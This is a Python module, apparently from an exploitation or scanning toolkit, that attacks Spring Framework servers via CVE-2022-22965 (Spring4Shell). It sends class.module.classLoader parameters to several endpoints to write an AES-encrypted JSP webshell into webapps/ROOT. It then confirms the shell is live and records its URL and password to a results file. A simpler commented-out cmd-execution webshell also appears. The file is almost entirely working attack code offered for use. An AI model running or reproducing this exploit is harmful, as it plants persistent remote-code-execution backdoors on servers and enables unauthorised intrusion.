#!/user/bin/env python3
# -*- coding: utf-8 -*-

import hashlib
import random
import time
from urllib.parse import urljoin,quote
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
class Cve_2022_22965:
    def spring_rce(self,alive_url):
        requests.packages.urllib3.disable_warnings()
        random_str_1 = ''.join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'], random.randint(2, 10)))
        random_str_2 = ''.join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'], random.randint(2, 10)))
        shell_name = ''.join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'], random.randint(8, 15)))
        random_passwd = ''.join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'], random.randint(15, 20)))
        # webshell = "%{"+ random_str_2 + "}i if(\"j\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{" + random_str_1 + "}i"

        m = hashlib.md5()
        m.update(random_passwd.encode("utf-8"))
        md5 = m.hexdigest()
        shell_passwd = md5[0:16]

        prefix = "%{" + random_str_2 + "}i"
        suffix = "%{" + random_str_1 + "}i"
        webshell = prefix + "@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"" + suffix + prefix + "!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}" + suffix + prefix + "if (request.getMethod().equals(\"POST\")){String k=\"" + shell_passwd + "\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);}" + suffix

        endpoints = ["index", "login", "add", "uploadFile", "download", ""]
        urls = []

        header = {"User-Agent": self.header,
                    "Connection": "close", "Content-Type": "application/x-www-form-urlencoded", "Accept-Encoding": "gzip, deflate",
                    random_str_1: "%>",
                    random_str_2: "<%"}

        data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=" + quote(webshell) + "&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps%2fROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=" + shell_name
        for endpoint in endpoints:
            url = urljoin(alive_url, endpoint)
            urls.append(url)
        for url in urls:
            try:
                a = requests.post(url, headers=header, allow_redirects=True, data=data, verify=self.ssl,proxies=self.proxy, timeout=10)
                time.sleep(5)
                if a.status_code == 405:
                    data = "?" + data
                    vuln_url = urljoin(url, data)
                    requests.get(vuln_url, headers=header, allow_redirects=True, verify=self.ssl,proxies=self.proxy, timeout=10)
                    data = "?" + "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
                    requests.get(urljoin(url, data), headers=header, allow_redirects=True, verify=self.ssl,proxies=self.proxy, timeout=10)
                else:
                    requests.post(url, headers=header, allow_redirects=True, data="class.module.classLoader.resources.context.parent.pipeline.first.pattern=", verify=self.ssl,proxies=self.proxy, timeout=10)
            except Exception as e:
                # print(e)
                if not self.batch:
                    OutPrintInfo("Spring", e)
                    OutPrintInfo("Spring", f"{alive_url}漏洞不存在或无法访问")
                # print(alive_url + ' 漏洞不存在或无法访问\n')
            try:
                shell_uri = shell_name + ".jsp"
                shell_url = urljoin(alive_url, shell_uri)
                # print(shell_url)
                # print(url)
                shell = requests.get(shell_url, timeout=15, verify=self.ssl,proxies=self.proxy, allow_redirects=False)
                if shell.status_code == 200:
                    OutPrintInfoSuc("Spring", f"存在漏洞，shell地址为: {shell_url}")
                    if not self.batch:
                        OutPrintInfo("Spring", f"[b bright_red]shell密码为: {random_passwd}")
                        requests.post(url, headers=header, allow_redirects=True, data="class.module.classLoader.resources.context.parent.pipeline.first.pattern=", verify=self.ssl,proxies=self.proxy, timeout=10)
                    else:
                        with open("./result/spring_2022_22965.txt","a") as w:
                            w.write(f"{shell_url}---Pass: {random_passwd}\n")
                    break
                else:
                    if not self.batch:
                        OutPrintInfo("Spring", f"[b yellow]shell地址状态码 {str(shell.status_code)}")
                        OutPrintInfo("Spring", f"{url}漏洞不存在或端点错误！")

            except Exception as e:
                if not self.batch:
                    OutPrintInfo("Spring", e)
                    OutPrintInfo("Spring", f"{alive_url}漏洞不存在或无法访问")
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.header = target["header"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Spring", '开始执行Spring CVE-2022-22965程代码执行漏洞...')
        self.spring_rce(url)
        if not self.batch:
            OutPrintInfo("Spring", 'Spring CVE-2022-22965程代码执行漏洞检测结束')
